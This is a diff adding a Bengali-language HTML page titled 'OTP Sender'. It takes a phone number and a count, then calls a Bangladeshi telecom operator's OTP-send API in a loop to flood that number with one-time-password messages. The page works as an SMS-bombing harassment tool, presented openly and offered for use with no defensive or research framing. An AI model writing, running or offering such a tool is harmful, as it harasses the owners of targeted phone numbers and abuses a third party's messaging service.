@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Sender</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f2f2f2, #e0e0e0);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            transition: background 0.5s;
+        }
+        /* Neumorphism Design */
+        .container-neumorphism {
+            background: #e0e0e0;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 9px 9px 20px #b8b8b8, 
+                        -9px -9px 20px #ffffff;
+            text-align: center;
+            width: 400px; /* Fixed width for the container */
+        }
+        /* Flat Design */
+        .container-flat {
+            background: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 400px; /* Fixed width for the container */
+        }
+        /* Neon Design */
+        .container-neon {
+            background: #1c1c1c;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            width: 400px; /* Fixed width for the container */
+            box-shadow: 0 0 20px rgba(76, 175, 80, 1), 
+                        0 0 30px rgba(76, 175, 80, 1);
+        }
+        h1 {
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="number"] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #4CAF50;
+            border-radius: 5px;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="number"]:focus {
+            border-color: #FF5722;
+            outline: none;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .response {
+            margin-top: 20px;
+            text-align: left;
+            max-width: 80%;
+            margin-left: auto;
+            margin-right: auto;
+            border: 1px solid #4CAF50; /* Border for the response box */
+            border-radius: 5px;
+            padding: 10px;
+            background-color: #f9f9f9; /* Light background for the response box */
+            max-height: 200px; /* Max height for the response area */
+            overflow-y: auto; /* Scroll if content exceeds max height */
+        }
+    </style>
+</head>
+<body>
+
+<!-- Use one of the following container classes: container-neumorphism, container-flat, container-neon -->
+<div class="container-neumorphism"> <!-- Change this class for different designs -->
+    <h1>OTP Sender</h1>
+    <input type="text" id="phone" placeholder="মোবাইল নম্বর লিখুন" required>
+    <input type="number" id="otpLimit" placeholder="কতগুলো OTP পাঠাতে চান" min="1" required>
+    <button id="sendOtp">Submit</button>
+    <div class="response" id="responseArea"></div>
+</div>
+
+<script>
+    async function api_23(phone) {
+        const url = "https://da-api.robi.com.bd/da-nll/otp/send";
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    msisdn: phone
+                })
+            });
+
+            const result = await response.json();
+            return result; // Return the result for further handling
+        } catch (error) {
+            console.error('API 23 ত্রুটি:', error);
+            throw new Error('API কল ব্যর্থ হয়েছে।'); // Return a user-friendly error message
+        }
+    }
+
+    document.getElementById('sendOtp').addEventListener('click', async () => {
+        const phone = document.getElementById('phone').value;
+        const otpLimit = parseInt(document.getElementById('otpLimit').value);
+        const responseArea = document.getElementById('responseArea');
+        responseArea.innerHTML = ''; // Clear previous responses
+
+        if (phone && otpLimit > 0) {
+            try {
+                for (let i = 0; i < otpLimit; i++) {
+                    const result = await api_23(phone); // Call the new API function
+                    responseArea.innerHTML += `<p>OTP ${i + 1}: সফলভাবে পাঠানো হয়েছে! প্রতিক্রিয়া: ${JSON.stringify(result)}</p>`;
+                }
+            } catch (error) {
+                responseArea.innerHTML += `<p>ত্রুটি: ${error.message}</p>`;
+            }
+        } else {
+            alert("দয়া করে মোবাইল নম্বর এবং OTP সংখ্যা পূরণ করুন।");
+        }
+    });
+</script>
+
+</body>
+</html>
